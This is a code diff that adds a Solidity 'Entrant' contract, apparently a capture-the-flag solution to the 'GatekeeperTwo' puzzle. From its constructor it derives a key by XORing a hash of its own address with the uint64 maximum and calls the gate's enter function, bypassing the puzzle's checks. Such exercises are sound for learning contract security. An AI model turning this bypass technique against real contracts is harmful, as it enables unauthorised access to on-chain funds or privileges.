@@ -34,3 +34,23 @@ contract GatekeeperTwo {
         return true;
     }
 }
+
+contract Entrant {
+    GatekeeperTwo public gates;
+
+    constructor(GatekeeperTwo _gates) {
+        gates = _gates;
+
+        _action();
+    }
+
+    function _action() private {
+        bytes8 key;
+        key = bytes8(
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
+                type(uint64).max
+        );
+
+        gates.enter(key);
+    }
+}
